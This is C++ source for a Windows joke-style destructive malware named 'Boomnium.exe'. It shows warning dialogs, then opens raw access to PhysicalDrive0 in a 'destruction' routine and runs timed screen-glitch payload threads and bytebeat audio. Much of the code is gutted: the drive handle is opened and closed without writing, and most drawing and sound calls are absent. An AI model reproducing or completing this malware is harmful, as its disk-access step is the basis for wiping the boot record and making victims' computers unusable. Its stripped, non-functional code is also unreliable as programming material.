#define _USE_MATH_DEFINES 1
#include <windows.h>
#include <windowsx.h>
#include <cmath>
#include <iostream>
static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }


VOID WINAPI destruction()
{
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);
    CloseHandle(hDevice);
}
DWORD WINAPI payload1(LPVOID lpParam)
{
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        if (!i)RedrawWindow(0, 0, 0, 133);
        HDC desk = GetDC(NULL);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = randy()%0xff;
        for (int i = 0; w * h > i; i++) {
            if (i % h == 0 && randy() % 100 == 0)
                v = randy() % 50;
            ((BYTE*)(data + i))[v % 3] += ((BYTE*)(data + i + v))[v] ^ byte;
        }
    }
    return 0;
} 

DWORD WINAPI payload2(LPVOID lpParam) 
{
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 10)
            byte = randy()%0xff;
        for (int i = 0; w * h > i; ++i) {
            if (!(i % h) && !(randy() % 110))
                v = randy() % 24;
            *((BYTE*)data + 4 * i + v) -= 5;
        }
    }
    return 0;
} 
DWORD WINAPI payload3(LPVOID lpParam) 
{
	int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);
    while(1){
    	HDC hdc = GetDC(0);
		POINT p[4]  = {rand() % sw, rand() % sh, rand() % sw, rand() % sh,  rand() % sw, rand() % sh};
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI payload3point1(LPVOID lpParam) 
{
	HDC desk;
	int sw, sh;
	
	while(1){
		desk = GetDC(0);
		sw = GetSystemMetrics(0);
		sh = GetSystemMetrics(1);
		ReleaseDC(0, desk);
		Sleep(4);
	}
}
DWORD WINAPI payload4(LPVOID lpParam)
{
    while (1) {
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI payload5(LPVOID lpParam)
{
	while(1){
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		HDC hdc = GetDC(0);
		POINT vertices[] = { {rand() % w, rand() % h}, {rand() % w, rand() % h}, {rand() % w, rand() % h} };
		ReleaseDC(0,hdc);
	}
}
DWORD WINAPI payload6(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
	while(1){
		HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;
		int top_x = 0 + x;
        int top_y = 0 + y;
        int bottom_x = 100 + x;
        int bottom_y = 100 + y; 
        if (y >= GetSystemMetrics(SM_CYSCREEN))
        {
                signY = -1;
        }
        if (x >= GetSystemMetrics(SM_CXSCREEN))
        {
            signX = -1;
        }
        if (y == 0)
        {
            signY = 1;
        }
        if (x == 0)
        {
            signX = 1;
        }
        Sleep(10);
        ReleaseDC(0, hdc);
	}
}
DWORD WINAPI payload6point1(LPVOID lpParam)
{
    HDC hdc;
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        hdc = GetDC(0);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI payload7(LPVOID lpParam)
{
	HDC hdc = GetDC(HWND_DESKTOP);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
	
	while (true)
	{
		HDC hdc = GetDC(HWND_DESKTOP);
		int y = rand()%sh, h = sh - rand()%sh - (sh / 1 - 8);
	    Sleep(10);
	}
}
DWORD WINAPI payload8(LPVOID lpParam)
{
	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 20;
			angle += M_PI / 40;
		}
		ReleaseDC(wnd, hdc);
	}
}
DWORD WINAPI payload9(LPVOID lpParam)
{
	int ticks = GetTickCount(), w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		int v = 0;BYTE bt = 0;
		if ((GetTickCount() - ticks) > 60000) bt = rand() & 0xffffff;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rand() % 100 == 0) v = rand() % 50;
			((BYTE*)(data + i))[v ? 252 : 252] += ((BYTE*)(data + i))[i % 3] ^ bt;
		}
	}
}
DWORD WINAPI payload10(LPVOID lpParam)
{
	while (1) {
		HDC hdc = GetDC(HWND_DESKTOP);
		int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
		ReleaseDC(0, hdc);
	}
}
VOID WINAPI audio1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>((~t/100|(t*3))^(t*3&(t>>5))&t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
}
VOID WINAPI audio2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t>>9^(t>>9)-1^1)%13*t;
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
}
VOID WINAPI audio3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>((t&((t>>5)))+(t|((t>>7))))&(t>>6)|(t>>5)&(t*(t>>7));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
}
VOID WINAPI audio4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t*((t&4096?6:16)+(1&t>>14))>>(3&t>>4))|(t>>(t&8192?3:4));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
}
VOID WINAPI audio5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t>>6|t<<1)+((t>>5|t<<3)|t>>3)|(t>>2)|(t<<1);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
}
VOID WINAPI audio6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t>>9&2*t&10*t)|(t>>5&6*t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
}
VOID WINAPI audio7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t*(((t>>11)&(t>>8))&(123&(t>>3))));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
}
VOID WINAPI audio8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(-t*(0xCA98>>(-t>>9&14)&15)|-t>>4);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
}
VOID WINAPI audio9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t>>13|t%24)&(t>>6|t%19);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
}
VOID WINAPI audiolast() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(20*t*t*(t>>11)/7);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
}
int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{

    if (MessageBoxW(NULL, L"The software you just executed malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test such as a virtual machine, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"Boomnium.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"Boomnium.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            destruction();
            HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);
            audio1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
            audio2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            HANDLE thread3point1 = CreateThread(0, 0, payload3point1, 0, 0, 0);
            HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
            audio3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            TerminateThread(thread3point1, 0);
            CloseHandle(thread3point1);
            HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
            audio4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
            audio5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
            HANDLE thread6point1 = CreateThread(0, 0, payload6point1, 0, 0, 0);
            audio6();
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            TerminateThread(thread6point1, 0);
            CloseHandle(thread6point1);
            HANDLE thread7 = CreateThread(0, 0, payload7, 0, 0, 0);
            audio7();
            Sleep(30000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            HANDLE thread8 = CreateThread(0, 0, payload8, 0, 0, 0);
            audio8();
            Sleep(30000);
            TerminateThread(thread8, 0);
            CloseHandle(thread8);
            HANDLE thread9 = CreateThread(0, 0, payload9, 0, 0, 0);
            audio9();
            Sleep(30000);
            TerminateThread(thread9, 0);
            CloseHandle(thread9);
        }
    }
}

